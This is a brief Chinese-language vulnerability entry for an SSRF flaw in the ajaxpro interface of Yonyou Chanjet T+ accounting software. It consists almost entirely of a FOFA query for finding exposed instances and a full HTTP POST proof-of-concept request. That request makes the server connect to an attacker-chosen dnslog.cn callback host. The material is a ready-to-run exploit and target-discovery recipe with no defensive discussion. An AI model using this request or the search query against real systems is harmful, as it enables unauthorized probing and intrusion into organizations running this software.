# 用友畅捷通-TPlus系统接口ajaxpro存在ssrf漏洞



## fofa

```yaml
app="畅捷通-TPlus"
```

## poc

```yaml
POST /tplus/ajaxpro/Ufida.T.SM.UIP.UA.AddressSettingController,Ufida.T.SM.UIP.ashx?method=TestConnnect HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=sfzg0pgxvld3ltgimecqkjg4; Hm_lvt_fd4ca40261bc424e2d120b806d985a14=1721822405; Hm_lpvt_fd4ca40261bc424e2d120b806d985a14=1721822415; HMACCOUNT=AFE08148BD092161
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

{
  "address":"ftlhbc.dnslog.cn"
}
```

